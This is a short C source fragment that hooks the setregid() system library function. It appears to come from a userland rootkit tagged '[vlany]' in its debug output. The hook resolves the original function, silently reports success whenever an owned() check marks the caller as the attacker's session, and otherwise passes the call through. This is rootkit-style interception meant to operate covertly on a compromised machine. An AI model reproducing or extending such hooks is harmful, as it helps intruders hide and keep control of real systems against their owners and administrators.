int setregid(gid_t rgid, gid_t egid)
{
    #ifdef DEBUG
        printf("[vlany] setregid() called\n");
    #endif

    HOOK(old_setregid, CSETREGID);

    if(owned()) return 0;

    return old_setregid(rgid, egid);
}
